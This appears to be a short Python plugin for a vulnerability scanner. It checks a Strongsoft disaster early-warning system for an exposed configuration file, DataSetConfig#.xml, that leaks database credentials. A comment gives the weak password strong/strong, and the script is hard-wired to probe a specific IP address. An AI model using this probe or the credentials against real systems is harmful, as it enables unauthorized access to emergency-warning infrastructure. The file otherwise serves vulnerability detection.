#!/usr/bin/env python
# -*- coding: utf-8 -*
# refer: http://www.wooyun.org/bugs/wooyun-2010-063623
# 福建四创灾害预警系统配置信息泄露以及弱口令获取 strong/strong

def assign(service, arg):
    if service == 'strongsoft':
        return True, arg
        
def audit(arg):
	vul_url = arg + "config/DataSetConfig%23.xml"
	code,_,res,_,_ = curl.curl(vul_url)
	if 'User ID' and 'password' in res:
            security_hole(vul_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('strongsoft','http://183.129.136.54:3050/')[1])